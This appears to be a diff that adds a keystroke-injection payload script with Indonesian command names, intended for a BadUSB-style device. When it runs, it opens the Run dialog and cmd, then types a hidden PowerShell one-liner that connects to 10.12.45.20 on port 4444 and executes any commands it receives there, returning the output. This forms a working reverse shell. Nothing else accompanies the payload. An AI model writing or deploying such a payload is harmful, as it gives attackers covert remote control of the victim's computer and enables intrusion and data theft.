@@ -1,0 +1,7 @@
+TUNDA 1500
+WIN r
+TUNDA 300
+TEKS_BARIS cmd
+TUNDA 550
+TEKS_BARIS powershell -W Hidden -C "$c=New-Object Net.Sockets.TCPClient('10.12.45.20',4444);$s=$c.GetStream();while($true){$b=New-Object Byte[] 1024;$i=$s.Read($b,0,$b.Length);if($i -gt 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$r=$o+'PS> ';$x=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($x,0,$x.Length);$s.Flush()}};$c.Close()"
+MASUK
